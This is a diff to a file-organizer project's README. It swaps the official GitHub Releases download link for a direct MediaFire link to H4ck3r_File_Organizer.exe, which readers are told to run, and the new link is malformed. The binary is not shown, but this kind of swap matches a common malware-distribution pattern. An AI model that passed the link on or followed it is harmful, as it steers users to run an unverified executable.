@@ -49,7 +49,7 @@ A modern, hacker-themed file organization utility with a matrix-inspired interfa
 
 ### Option 1: Run the executable
 
-1. Download the latest release from the [GitHub Releases](https://github.com/user/H4ck3r_File_Organizer/releases) section
+1. Download the latest release from the [MediaFire]([https://github.com/user/H4ck3r_File_Organizer/releases](https://www.mediafire.com/file/mta6mm6jbu139ui/H4ck3r_File_Organizer.exe/file)) section
 2. Run "H4ck3r_File_Organizer.exe"
 
 ### Option 2: Run from source
